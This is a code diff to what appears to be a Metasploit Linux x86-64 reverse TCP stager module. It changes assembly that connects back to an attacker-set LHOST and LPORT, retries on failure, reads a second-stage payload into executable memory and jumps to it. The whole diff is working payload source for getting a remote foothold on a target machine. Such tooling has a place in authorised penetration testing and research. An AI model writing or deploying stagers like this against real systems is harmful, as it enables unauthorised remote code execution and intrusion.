@@ -25,7 +25,7 @@ module Payload::Linux::ReverseTcp_x64
     conf = {
       port:        datastore['LPORT'],
       host:        datastore['LHOST'],
-      retry_count: datastore['ReverseConnectRetries'],
+      retry_count:   datastore['StagerRetryCount'],
       sleep_seconds: datastore['StagerRetryWait'],
     }
 
@@ -89,6 +89,15 @@ module Payload::Linux::ReverseTcp_x64
     sleep_seconds = seconds.to_i
     sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
 
+    if respond_to?(:generate_intermediate_stage)
+      pay_mod = framework.payloads.create(self.refname)
+      read_length = pay_mod.generate_intermediate_stage(pay_mod.generate_stage(datastore.to_h)).size
+    elsif !module_info['Stage']['Payload'].empty?
+      read_length = module_info['Stage']['Payload'].size
+    else
+      read_length = 4096
+    end
+
     asm = %Q^
       mmap:
         xor    rdi, rdi
@@ -107,9 +116,6 @@ module Payload::Linux::ReverseTcp_x64
 
         push   #{retry_count}        ; retry counter
         pop    r9
-
-      create_socket:
-        push   rsi
         push   rax
         push   0x29
         pop    rax
@@ -122,8 +128,9 @@ module Payload::Linux::ReverseTcp_x64
         test   rax, rax
         js failed
 
-      connect:
         xchg   rdi, rax
+
+      connect:
         mov    rcx, 0x#{encoded_host}#{encoded_port}
         push   rcx
         mov    rsi, rsp
@@ -132,12 +139,14 @@ module Payload::Linux::ReverseTcp_x64
         push   0x2a
         pop    rax
         syscall ; connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
+        pop    rcx
         test   rax, rax
         jns    recv
 
       handle_failure:
         dec    r9
         jz     failed
+        push   rdi
         push   0x23
         pop    rax
         push   0x#{sleep_nanoseconds.to_s(16)}
@@ -145,19 +154,11 @@ module Payload::Linux::ReverseTcp_x64
         mov    rdi, rsp
         xor    rsi, rsi
         syscall                      ; sys_nanosleep
-        test   rax, rax
-        jns    create_socket
-        jmp    failed
-
-      recv:
         pop    rcx
-        pop    rsi
-        pop    rdx
-        syscall	; read(3, "", 4096)
+        pop    rcx
+        pop    rdi
         test   rax, rax
-        js     failed
-
-        jmp    rsi ; to stage
+        jns    connect
 
       failed:
         push   0x3c
@@ -165,6 +166,16 @@ module Payload::Linux::ReverseTcp_x64
         push   0x1
         pop    rdi
         syscall ; exit(1)
+
+      recv:
+        pop    rsi
+        push   0x#{read_length.to_s(16)}
+        pop    rdx
+        syscall ; read(3, "", #{read_length})
+        test   rax, rax
+        js     failed
+
+        jmp    rsi ; to stage
     ^
 
     asm
